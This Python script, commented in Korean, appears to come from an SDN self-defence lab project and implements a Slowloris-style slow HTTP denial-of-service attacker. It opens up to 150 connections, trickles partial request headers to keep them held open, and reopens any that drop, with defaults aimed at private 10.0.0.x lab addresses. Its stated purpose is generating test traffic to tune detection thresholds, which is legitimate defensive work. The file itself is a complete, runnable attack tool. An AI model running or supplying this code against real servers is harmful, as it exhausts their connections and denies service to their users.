"""Self-Defending SDN Tower - Slow HTTP 공격기 (Slowloris 방식, 판단 기준 측정용).

서버에 연결을 많이 열고 요청 헤더를 끝내지 않은 채, 헤더 한 줄씩을 아주 천천히 보낸다.
연결 하나는 정상적으로 맺어지고(SYN·SYN-ACK·ACK) 패킷도 적어서 Flood 기준에는 걸리지 않지만,
서버는 요청이 끝나기를 기다리며 연결을 계속 붙잡고 있게 된다. 표준 라이브러리만 쓴다.

실행 예: python3 -m traffic.traffic_slowhttp --server 10.0.0.4 --sockets 150 --interval 10 --duration 60
"""

from __future__ import annotations

import argparse
import random
import socket
import time
from typing import List


def open_slow(server: str, port: int) -> socket.socket:
    s = socket.create_connection((server, port), timeout=4)
    s.sendall(f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\nHost: {server}\r\n".encode())
    return s


def run(server: str, port: int, sockets: int, interval: float, duration: float, open_rate: float) -> dict:
    """sockets개를 초당 open_rate개씩 열고, interval초마다 각 연결에 헤더 한 줄을 보낸다. 끊긴 연결은 다시 연다."""
    conns: List[socket.socket] = []
    opened = reopened = 0
    deadline = time.monotonic() + duration
    while len(conns) < sockets and time.monotonic() < deadline:
        try:
            conns.append(open_slow(server, port))
            opened += 1
        except OSError:
            pass
        time.sleep(1.0 / open_rate)
    while time.monotonic() < deadline:
        time.sleep(min(interval, max(0.0, deadline - time.monotonic())))
        for i, s in enumerate(conns):
            try:
                s.sendall(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except OSError:
                try:
                    conns[i] = open_slow(server, port)
                    reopened += 1
                except OSError:
                    pass
    for s in conns:
        s.close()
    return {"opened": opened, "reopened": reopened, "held": len(conns)}


def main() -> None:
    p = argparse.ArgumentParser(description="Slow HTTP 공격기 (Slowloris 방식)")
    p.add_argument("--server", default="10.0.0.11")
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--sockets", type=int, default=150, help="붙잡을 연결 수 (Slowloris 기본값 150)")
    p.add_argument("--interval", type=float, default=10.0, help="연결마다 헤더 한 줄을 보내는 간격(초)")
    p.add_argument("--open-rate", type=float, default=50.0, help="연결을 여는 속도(초당)")
    p.add_argument("--duration", type=float, default=60.0)
    a = p.parse_args()
    r = run(a.server, a.port, a.sockets, a.interval, a.duration, a.open_rate)
    print(f"[traffic_slowhttp] {r['held']}개 연결 유지, 다시 연 연결 {r['reopened']}개, {a.duration:.0f}초", flush=True)


if __name__ == "__main__":
    main()
